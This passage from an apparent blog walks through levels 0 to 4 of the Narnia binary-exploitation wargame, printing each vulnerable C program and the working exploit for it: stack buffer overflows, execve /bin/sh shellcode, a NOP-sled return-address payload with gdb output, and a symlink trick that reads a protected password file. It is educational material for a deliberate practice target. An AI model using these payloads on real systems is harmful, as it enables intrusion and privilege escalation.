</pre></div>
</p>

<p>I had to poke around the file system a bit to find this, but <code>/etc/passwd</code> is
usually a <em>go-to</em> file if you get access to a system. Otherwise I&rsquo;d still
be looking for the file now :)</p>

<p>So that&rsquo;s one way to do it.</p>

<p>This seems to be the most direct route in. It might be worth exploring the
vulnerabilities on the plugins, but it&rsquo;s late now, so I&rsquo;ll save that for
another time.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/04/08/solving-narnia-part1/">
        Solving Narnia Part 1
      </a>
    </h1>

    <span class="post-date">Wed, Apr 8, 2015</span>

    

<p>Next up we take on <a href="http://overthewire.org/wargames/narnia/">Narnia</a>. This is a
binary exploit centered wargame, so fire up your debuggers and let&rsquo;s smash those
stacks. For levels 5, 6, 7, and 8, see <a href="http://unlogic.co.uk/2015/04/13/solving-narnia-part-2/">part 2</a></p>

<p>All levels are in <code>/narnia</code> and both the binary and the source are provided.</p>

<p>I&rsquo;ve not included the passwords here, so you&rsquo;ll have to work through
the exercises yourself (or find them elsewhere :))</p>

<h2 id="level-00:dadecd8e397495e170ebcbe00dd8239d">Level 00</h2>

<table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(){</span>
        <span style="color: #66d9ef">long</span> <span style="color: #f8f8f2">val</span><span style="color: #f92672">=</span><span style="color: #ae81ff">0x41414141</span><span style="color: #f8f8f2">;</span>
        <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buf[</span><span style="color: #ae81ff">20</span><span style="color: #f8f8f2">];</span>

        <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
        <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Here is your chance: &quot;</span><span style="color: #f8f8f2">);</span>
        <span style="color: #f8f8f2">scanf(</span><span style="color: #e6db74">&quot;%24s&quot;</span><span style="color: #f8f8f2">,</span><span style="color: #f92672">&amp;</span><span style="color: #f8f8f2">buf);</span>

        <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;buf: %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,buf);</span>
        <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;val: 0x%08x</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,val);</span>

        <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(val</span><span style="color: #f92672">==</span><span style="color: #ae81ff">0xdeadbeef</span><span style="color: #f8f8f2">)</span>
                <span style="color: #f8f8f2">system(</span><span style="color: #e6db74">&quot;/bin/sh&quot;</span><span style="color: #f8f8f2">);</span>
        <span style="color: #66d9ef">else</span> <span style="color: #f8f8f2">{</span>
                <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;WAY OFF!!!!</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
                <span style="color: #f8f8f2">exit(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
        <span style="color: #f8f8f2">}</span>

        <span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table>

<p>Lines 8 and 9 tell us what we need to do. So knowing how variable allocation
on the stack works, we can exploit the setup on lines 5 and 6. <code>buf</code> is a
fixed size and is allocated <em>after</em> <code>val</code>. Therefore it sits above <code>val</code> on
the stack. As there is no <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</a>
we should be able to write over the end of <code>buf</code> and overwrite what is in memory
at <code>val</code>&rsquo;s location.</p>

<p>So let&rsquo;s try it</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia0@melinda:/narnia$ python -c <span style="color: #e6db74">&quot;print &#39;C&#39;*50&quot;</span> <span style="color: #f8f8f2">|</span> ./narnia0 
Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCCCCC
val: 0x43434343
WAY OFF!!!!
</pre></div>


<p>Right, we can confirm that we are able to change the value of <code>val</code>. Let&rsquo;s
tread a bit more carefully and try to see if we can do it more accurately</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia0@melinda:/narnia$ python -c <span style="color: #e6db74">&quot;print &#39;C&#39;*20 + &#39;BBBB&#39;&quot;</span> <span style="color: #f8f8f2">|</span> ./narnia0 
Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCBBBB
val: 0x42424242
WAY OFF!!!!
</pre></div>


<p>So there is no space between <code>val</code> and <code>buf</code>, therefore 20 characters plus a
further 4 is enough to change val. Let&rsquo;s write in the correct value, reversed of
course because of the endian notation</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia0@melinda:/narnia$ python -c <span style="color: #e6db74">&quot;print &#39;C&#39;*20 + &#39;\xef\xbe\xad\xde&#39;&quot;</span> <span style="color: #f8f8f2">|</span> ./narnia0
Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ
val: 0xdeadbeef
narnia0@melinda:/narnia$
</pre></div>


<p>We did it&hellip;. but wait, where&rsquo;s the shell? It&rsquo;s closed, that&rsquo;s where it is. We
need to keep it open. The trick is to append the <code>cat</code> command to the input</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia0@melinda:/narnia$ <span style="color: #f92672">(</span>python -c <span style="color: #e6db74">&quot;print &#39;C&#39;*20 + &#39;\xef\xbe\xad\xde&#39;&quot;</span><span style="color: #f8f8f2">;</span> cat<span style="color: #f92672">)</span> <span style="color: #f8f8f2">|</span> ./narnia0
Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ
val: 0xdeadbeef
id
uid=14000(narnia0) gid=14000(narnia0) euid=14001(narnia1) groups=14001(narnia1),14000(narnia0)
whoami
narnia1
cat /etc/narnia_pass/narnia1
[password]
</pre></div>


<h2 id="level-01:dadecd8e397495e170ebcbe00dd8239d">Level 01</h2>

<p><table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdio.h&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(){</span>
	<span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">(</span><span style="color: #f92672">*</span><span style="color: #f8f8f2">ret)();</span>

	<span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(getenv(</span><span style="color: #e6db74">&quot;EGG&quot;</span><span style="color: #f8f8f2">)</span><span style="color: #f92672">==</span><span style="color: #f8f8f2">NULL){</span>    
		<span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Give me something to execute at the env-variable EGG</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
		<span style="color: #f8f8f2">exit(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
	<span style="color: #f8f8f2">}</span>

	<span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Trying to execute EGG!</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">);</span>
	<span style="color: #f8f8f2">ret</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">getenv(</span><span style="color: #e6db74">&quot;EGG&quot;</span><span style="color: #f8f8f2">);</span>
	<span style="color: #f8f8f2">ret();</span>

	<span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table></p>

<p>So here we need to set an environment variable named <code>EGG</code> to something
we want executed. We can&rsquo;t just pass <code>/bin/bash</code> as it&rsquo;s going to call whatever
we give it as a function. Ideally we want a shell, so what we need in this case
is the shellcode to do just that.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia1@melinda:/narnia$ <span style="color: #f8f8f2">export EGG</span><span style="color: #f92672">=</span><span style="color: #66d9ef">$(</span>python -c<span style="color: #e6db74">&#39;print &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot;&#39;</span><span style="color: #66d9ef">)</span>
narnia1@melinda:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
[password]
</pre></div>
</p>

<h2 id="level-02:dadecd8e397495e170ebcbe00dd8239d">Level 02</h2>

<p><table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt;</span>
<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">*</span> <span style="color: #f8f8f2">argv[]){</span>
	<span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buf[</span><span style="color: #ae81ff">128</span><span style="color: #f8f8f2">];</span>

	<span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(argc</span> <span style="color: #f92672">==</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">){</span>
		<span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;Usage: %s argument</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]);</span>
		<span style="color: #f8f8f2">exit(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
	<span style="color: #f8f8f2">}</span>
	<span style="color: #f8f8f2">strcpy(buf,argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>
	<span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;%s&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">buf);</span>

	<span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table></p>

<p>The biggest clues here are lines 6 and 12. Copying user supplied data
into a fixed sized array without any bound checking is always asking for
trouble. <code>narnia2</code> binary also runs as setuid narnia3, which leads us to believe
we will be able to control the stack and get it to execute a payload of our
choosing. Of course this will be a shellcode to drop us into a shell.</p>

<p>First we need to work out how much data is needed to overwrite <code>EIP</code>. We can
do this by trial and error, or we can use a pattern generator. I am going to
use my <a href="https://github.com/Svenito/exploit-pattern">pattern generator</a> instead
of metasploit&rsquo;s one. I&rsquo;ll create a payload big enugh to overflow the
buffer and then check the value of <code>EIP</code>. Pasting that back into the pattern
generator will tell us at what location in the pattern the string occurs.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">local $] ./pattern.py 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
</pre></div>
</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia2@melinda:/narnia$ gdb -q narnia2
Reading symbols from narnia2...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
Starting program: /games/narnia/narnia2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
(gdb) info reg
eax            0x0	0
ecx            0x0	0
edx            0xf7fcb898	-134432616
ebx            0xf7fca000	-134438912
esp            0xffffd640	0xffffd640
ebp            0x65413565	0x65413565
esi            0x0	0
edi            0x0	0
eip            0x37654136	0x37654136
eflags         0x10282	[ SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
</pre></div>
</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">local $] ./pattern.py 0x37654136
Pattern 0x37654136 first occurrence at position 140 in pattern.
</pre></div>
</p>

<p>We can control <code>EIP</code> with whatever we put at position 140 of our payload. But
what do we put there? Well for that we need to figure out where the rest of our
data is going. Using a known payload let&rsquo;s see where our input ends up:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">(gdb) run $(python -c &quot;print &#39;a&#39; * 140 + &#39;b&#39; * 4&quot;)
Starting program: /games/narnia/narnia2 $(python -c &quot;print &#39;a&#39; * 140 + &#39;b&#39; * 4&quot;)

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) x/200x $esp
(gdb) x/200x $esp
0xffffd650:	0x00000000	0xffffd6e4	0xffffd6f0	0xf7feacea
0xffffd660:	0x00000002	0xffffd6e4	0xffffd684	0x08049768
0xffffd670:	0x0804821c	0xf7fca000	0x00000000	0x00000000
0xffffd680:	0x00000000	0xed18585e	0xd520bc4e	0x00000000
0xffffd690:	0x00000000	0x00000000	0x00000002	0x08048360
0xffffd6a0:	0x00000000	0xf7ff0500	0xf7e3c979	0xf7ffd000
0xffffd6b0:	0x00000002	0x08048360	0x00000000	0x08048381
0xffffd6c0:	0x0804845d	0x00000002	0xffffd6e4	0x080484d0
0xffffd6d0:	0x08048540	0xf7feb180	0xffffd6dc	0x0000001c
0xffffd6e0:	0x00000002	0xffffd812	0xffffd828	0x00000000
0xffffd6f0:	0xffffd8b9	0xffffd8cd	0xffffd8dd	0xffffd8f0
0xffffd700:	0xffffd913	0xffffd927	0xffffd930	0xffffd93d
0xffffd710:	0xffffde5e	0xffffde69	0xffffde75	0xffffded3
0xffffd720:	0xffffdeea	0xffffdef9	0xffffdf05	0xffffdf16
0xffffd730:	0xffffdf1f	0xffffdf32	0xffffdf3a	0xffffdf4a
0xffffd740:	0xffffdf80	0xffffdfa0	0xffffdfc0	0x00000000
0xffffd750:	0x00000020	0xf7fdbb60	0x00000021	0xf7fdb000
0xffffd760:	0x00000010	0x1f898b75	0x00000006	0x00001000
0xffffd770:	0x00000011	0x00000064	0x00000003	0x08048034
0xffffd780:	0x00000004	0x00000020	0x00000005	0x00000008
0xffffd790:	0x00000007	0xf7fdc000	0x00000008	0x00000000
0xffffd7a0:	0x00000009	0x08048360	0x0000000b	0x000036b2
0xffffd7b0:	0x0000000c	0x000036b2	0x0000000d	0x000036b2
0xffffd7c0:	0x0000000e	0x000036b2	0x00000017	0x00000000
0xffffd7d0:	0x00000019	0xffffd7fb	0x0000001f	0xffffdfe2
0xffffd7e0:	0x0000000f	0xffffd80b	0x00000000	0x00000000
0xffffd7f0:	0x00000000	0x00000000	0xe8000000	0x7c03ba19
0xffffd800:	0x2bd0895a	0x3866226d	0x69ad5957	0x00363836
0xffffd810:	0x672f0000	0x73656d61	0x72616e2f	0x2f61696e
0xffffd820:	0x6e72616e	0x00326169	0x61616161	0x61616161
0xffffd830:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd840:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd850:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd860:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd870:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd880:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd890:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8a0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd8b0:	0x61616161	0x62626262	0x47445800	0x5345535f
0xffffd8c0:	0x4e4f4953	0x3d44495f	0x30333035	0x45485300
0xffffd8d0:	0x2f3d4c4c	0x2f6e6962	0x68736162	0x52455400
0xffffd8e0:	0x78723d4d	0x322d7476	0x6f633635	0x00726f6c
0xffffd8f0:	0x5f485353	0x45494c43	0x323d544e	0x322e3231
0xffffd900:	0x37352e33	0x3136312e	0x35333320	0x34203932
0xffffd910:	0x53003334	0x545f4853	0x2f3d5954	0x2f766564
0xffffd920:	0x2f737470	0x4c003033	0x4c415f43	0x00433d4c
0xffffd930:	0x52455355	0x72616e3d	0x3261696e	0x5f534c00
0xffffd940:	0x4f4c4f43	0x723d5352	0x3a303d73	0x303d6964
0xffffd950:	0x34333b31	0x3d6e6c3a	0x333b3130	0x686d3a36
0xffffd960:	0x3a30303d	0x343d6970	0x33333b30	0x3d6f733a
</pre></div>
</p>

<p>We see our payload start at <code>0xffffd828</code> with the last 4 bytes at <code>0xffffd8b4</code></p>

<p>The buffer gives us 128 bytes to play with. Our shellcode is 25 bytes, so we&rsquo;ll pad the
start with a <a href="https://en.wikipedia.org/wiki/NOP_slide">nop sled</a> to adjust for
the memory offset introduced by <code>gdb</code>. Then set the <code>EIP</code> to somewhere in the middle
of the sled</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia2@melinda:/narnia$ ./narnia2 <span style="color: #e6db74">`</span>python -c <span style="color: #e6db74">&quot;print &#39;\x90&#39;*115 + &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&#39; + &#39;\x60\xd8\xff\xff&#39;&quot;`</span>
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
[password]
</pre></div>
</p>

<h2 id="level-03:dadecd8e397495e170ebcbe00dd8239d">Level 03</h2>

<p><table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;sys/types.h&gt;</span>
<span style="color: #75715e">#include &lt;sys/stat.h&gt;</span>
<span style="color: #75715e">#include &lt;fcntl.h&gt;</span>
<span style="color: #75715e">#include &lt;unistd.h&gt;</span>
<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;string.h&gt; </span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv){</span>
 
        <span style="color: #66d9ef">int</span>  <span style="color: #f8f8f2">ifd,</span>  <span style="color: #f8f8f2">ofd;</span>
        <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">ofile[</span><span style="color: #ae81ff">16</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&quot;/dev/null&quot;</span><span style="color: #f8f8f2">;</span>
        <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">ifile[</span><span style="color: #ae81ff">32</span><span style="color: #f8f8f2">];</span>
        <span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buf[</span><span style="color: #ae81ff">32</span><span style="color: #f8f8f2">];</span>
 
        <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(argc</span> <span style="color: #f92672">!=</span> <span style="color: #ae81ff">2</span><span style="color: #f8f8f2">){</span>
                <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;usage, %s file, will send contents of file 2 /dev/null</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,argv[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]);</span>
                <span style="color: #f8f8f2">exit(</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
        <span style="color: #f8f8f2">}</span>
 
        <span style="color: #75715e">/* open files */</span>
        <span style="color: #f8f8f2">strcpy(ifile,</span> <span style="color: #f8f8f2">argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>
        <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">((ofd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">open(ofile,O_RDWR))</span> <span style="color: #f92672">&lt;</span> <span style="color: #ae81ff">0</span> <span style="color: #f8f8f2">){</span>
                <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;error opening %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">ofile);</span>
                <span style="color: #f8f8f2">exit(</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
        <span style="color: #f8f8f2">}</span>
        <span style="color: #66d9ef">if</span><span style="color: #f8f8f2">((ifd</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">open(ifile,</span> <span style="color: #f8f8f2">O_RDONLY))</span> <span style="color: #f92672">&lt;</span> <span style="color: #ae81ff">0</span> <span style="color: #f8f8f2">){</span>
                <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;error opening %s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">ifile);</span>
                <span style="color: #f8f8f2">exit(</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
        <span style="color: #f8f8f2">}</span>
 
        <span style="color: #75715e">/* copy from file1 to file2 */</span>
        <span style="color: #f8f8f2">read(ifd,</span> <span style="color: #f8f8f2">buf,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buf)</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
        <span style="color: #f8f8f2">write(ofd,buf,</span> <span style="color: #66d9ef">sizeof</span><span style="color: #f8f8f2">(buf)</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
        <span style="color: #f8f8f2">printf(</span><span style="color: #e6db74">&quot;copied contents of %s to a safer place... (%s)</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span><span style="color: #f8f8f2">,ifile,ofile);</span>
 
        <span style="color: #75715e">/* close &#39;em */</span>
        <span style="color: #f8f8f2">close(ifd);</span>
        <span style="color: #f8f8f2">close(ofd);</span>
 
        <span style="color: #f8f8f2">exit(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">);</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table></p>

<p>At first glance this looks a bit more complicated. However it is just another
buffer overflow (line 13 and 22). This time however we don&rsquo;t control the stack,
we control where the file gets written to. <code>/dev/null</code> is not a useful place
for data, and we want the contents of <code>/etc/narnia_pass/narnia4</code>. As <code>narnia3</code> runs
setuid narnia4, it can do that for us.</p>

<p>First we determine that we need 32 characters to overflow the buffer. Then anything
beyond that will get written to the ofile. So the plan is to to create a symlink to
<code>narnia4</code> that is 32 characters long, and then write that to the target. The issue here
is that the source path&rsquo;s last 16 characters need to be the same as the target.
So to do this I created the following directory and symlink:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia3@melinda:/narnia$ mkdir -p /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp
narnia3@melinda:/narnia$ ln -s /etc/narnia_pass/narnia4 /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4
</pre></div>
</p>

<p>Now when we pass that to <code>narnia3</code>:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">narnia3@melinda:/narnia$ ./narnia3 <span style="color: #e6db74">`</span>python -c <span style="color: #e6db74">&quot;print &#39;/tmp/&#39; + &#39;x&#39;*27 + &#39;/tmp/narn4&#39;&quot;`</span> 
copied contents of /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4 to a safer place... (/tmp/narn4)
narnia3@melinda:/narnia$ cat /tmp/narn4 
[password]
</pre></div>
</p>

<p>It&rsquo;s a little odd, but I hope you understand what happened. The last part of the
first path has to be a valid path, so that it can be written to. That&rsquo;s why we have
the double <code>/tmp</code> setup.</p>

<h2 id="level-04:dadecd8e397495e170ebcbe00dd8239d">Level 04</h2>

<p><table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</pre></div></td><td class="code"><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#include &lt;string.h&gt;</span>
<span style="color: #75715e">#include &lt;stdlib.h&gt;</span>
<span style="color: #75715e">#include &lt;stdio.h&gt;</span>
<span style="color: #75715e">#include &lt;ctype.h&gt;</span>

<span style="color: #66d9ef">extern</span> <span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">environ;</span>

<span style="color: #66d9ef">int</span> <span style="color: #a6e22e">main</span><span style="color: #f8f8f2">(</span><span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">argc,</span><span style="color: #66d9ef">char</span> <span style="color: #f92672">**</span><span style="color: #f8f8f2">argv){</span>
	<span style="color: #66d9ef">int</span> <span style="color: #f8f8f2">i;</span>
	<span style="color: #66d9ef">char</span> <span style="color: #f8f8f2">buffer[</span><span style="color: #ae81ff">256</span><span style="color: #f8f8f2">];</span>

	<span style="color: #66d9ef">for</span><span style="color: #f8f8f2">(i</span> <span style="color: #f92672">=</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span> <span style="color: #f8f8f2">environ[i]</span> <span style="color: #f92672">!=</span> <span style="color: #f8f8f2">NULL;</span> <span style="color: #f8f8f2">i</span><span style="color: #f92672">++</span><span style="color: #f8f8f2">)</span>
		<span style="color: #f8f8f2">memset(environ[i],</span> <span style="color: #e6db74">&#39;\0&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">strlen(environ[i]));</span>

	<span style="color: #66d9ef">if</span><span style="color: #f8f8f2">(argc</span><span style="color: #f92672">&gt;</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)</span>
		<span style="color: #f8f8f2">strcpy(buffer,argv[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]);</span>

	<span style="color: #66d9ef">return</span> <span style="color: #ae81ff">0</span><span style="color: #f8f8f2">;</span>
<span style="color: #f8f8f2">}</span>
</pre></div>
</td></tr></table></p>

<p>MOAR OVERFLOWS. This time you&rsquo;ll notice something at line 6. What this does
is <a href="http://man7.org/linux/man-pages/man7/environ.7.html">store the user environment</a>.
This then get zerod out inside <code>main</code> to prevent us from storing any shellcode
in environment variables. However we might still be able to write <code>EIP</code>, so using the
trusty pattern generator from before</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">local $] ./pattern.py 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7
Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5
